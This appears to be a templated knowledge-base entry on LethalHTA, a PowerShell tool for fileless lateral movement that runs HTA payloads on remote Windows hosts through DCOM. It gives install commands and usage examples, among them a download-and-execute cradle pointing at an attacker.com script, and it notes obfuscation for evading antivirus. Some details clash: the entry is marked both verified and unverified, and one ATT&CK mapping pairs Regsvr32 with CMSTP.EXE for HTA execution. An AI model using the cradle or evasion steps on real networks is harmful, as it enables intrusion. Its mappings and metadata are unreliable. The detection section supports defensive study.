---
id: d1dce539-3995-44b0-af6b-2a74907a199f
type: tool
verified: true
created_at: '2019-08-28T21:17:27.774871+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - lateral-movement
  - dcom
  - hta
  - post-exploitation
url: 'https://github.com/GrapheneMan/LethalHTA'
validated: true
---

# LethalHTA

**Status**: Unverified

## Overview

LethalHTA is a PowerShell-based tool for lateral movement in Windows environments. It leverages DCOM (Distributed Component Object Model) to execute HTML Applications (HTA) remotely, allowing attackers to run payloads on target systems without dropping executable files or requiring SMB shares.

## Description

LethalHTA generates obfuscated HTA files that embed arbitrary payloads (e.g., PowerShell commands). These HTA files are then executed on remote machines using DCOM interfaces like Shell.Application, bypassing common defenses such as AppLocker or file-based detection. It's particularly useful in Active Directory environments for moving laterally between compromised hosts while maintaining operational security.

## Features

- Feature 1: Generates standalone HTA files with embedded payloads for remote execution.
- Feature 2: Uses DCOM for fileless lateral movement, avoiding disk writes on targets.
- Feature 3: Supports arbitrary command execution, including downloading and running additional scripts.
- Feature 4: Obfuscation options to evade basic antivirus detection.

## Installation

### Requirements

- PowerShell 2.0 or later (Windows 7+).
- Administrative privileges on the attacking machine.
- Network access to target via DCOM (ports 135, dynamic RPC ports open).

### Install Commands

```powershell
# Download from GitHub
Invoke-WebRequest -Uri 'https://github.com/GrapheneMan/LethalHTA/archive/master.zip' -OutFile 'LethalHTA.zip'
Expand-Archive -Path 'LethalHTA.zip' -DestinationPath 'C:\Tools'

# Import the module
Import-Module C:\Tools\LethalHTA-master\LethalHTA.ps1
```

For Kali/Ubuntu (cross-platform use via Wine or PS Core): Install PowerShell Core with `sudo apt install powershell`, then download and import as above.

## Basic Usage

```powershell
# View help
Get-Help New-LethalHTA -Full
```

### Common Options

| Option | Description |
|--------|-------------|
| -Payload | Specifies the command to embed in the HTA |
| -OutFile | Output path for the generated HTA file |
| -Obfuscate | Enables basic obfuscation of the HTA content |

## Examples

### Example 1: Basic Usage

Generate and execute a simple payload:

```powershell
New-LethalHTA -Payload "whoami" -OutFile payload.hta
# Then execute remotely (see related commands)
```

### Example 2: Advanced Usage

Embed a download cradle:

```powershell
New-LethalHTA -Payload "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')" -OutFile advanced.hta -Obfuscate
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Service Execution]] System Services: Service Execution (DCOM activation)
- [[Regsvr32]] Signed Binary Proxy Execution: CMSTP.EXE (via HTA execution)
- [[PowerShell]] Command and Scripting Interpreter: PowerShell

### Tactics

- [[Lateral Movement]] Lateral Movement
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for HTA file executions via Sysmon Event ID 1 (process creation of mshta.exe).
- Detection method 2: DCOM activation logs in Windows Event ID 10000-10016 on port 135.
- Detection method 3: Network traffic to dynamic RPC ports (1024-65535) from Shell.Application COM objects.
- Detection method 4: PowerShell script block logging for Import-Module or New-Object ComObject calls.

## Related Commands

- [[commands/powershell-import-lethalhta]]
- [[commands/new-lethalhta-payload]]
- [[commands/invoke-lethalhta-dcom]]

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/PowerSploit]]
- [[tools/Empire]]

## References

- Official GitHub: https://github.com/GrapheneMan/LethalHTA
- Harmj0y's Blog Post: https://blog.netspi.com/lateral-movement-via-dcom-and-hta/
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1569/002/
